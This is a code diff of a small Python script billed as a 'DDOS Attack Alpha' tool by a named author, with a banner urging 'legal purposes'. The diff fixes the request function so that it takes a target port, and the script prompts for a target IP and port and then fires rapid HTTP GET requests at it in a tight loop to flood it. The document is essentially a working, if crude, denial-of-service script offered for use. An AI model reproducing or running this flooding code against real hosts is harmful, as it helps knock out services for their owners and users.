@@ -12,7 +12,7 @@ def print_attractive_text():
     subtitle_font = pyfiglet.Figlet(font='small')
 
     # Define the text
-    title = "DDOS Attack Alpha"
+    title = "ROOT RELUX"
     subtitle = "Made by JUNAYAD AHSAN"
     description = "DDOS Attack Alpha"
 
@@ -23,13 +23,13 @@ def print_attractive_text():
     print(Fore.MAGENTA + f"By this code, people can know about {Style.BRIGHT}{description}.")
     print(Fore.RED + f"Use this tool for {Style.BRIGHT}legal purposes.")
 
-def send_request(ip):
+def send_request(ip, port):
     try:
-        # Assuming you want to send a request to a specific port on the IP
-        url = f'http://{ip}:{port}'  # You can specify a port if needed, e.g., http://{ip}:80
+        # Construct the URL with the specified IP and port
+        url = f'http://{ip}:{port}'  # Assuming HTTP protocol
         response = requests.get(url)
         if response.status_code == 200:
-            print(Fore.GREEN + "Request sent to", ip)
+            print(Fore.GREEN + "Request sent to", url)
         else:
             print(Fore.YELLOW + "Request failed with status code:", response.status_code)
     except Exception as e:
@@ -43,5 +43,5 @@ if __name__ == "__main__":
     port = input('Input the target port (e.g., 80 for HTTP, 443 for HTTPS): ')
 
     for _ in range(n):
-        send_request(ip ,port)
+        send_request(ip, port)
         time.sleep(0.0001)  # Be cautious with the sleep time to avoid overwhelming the target
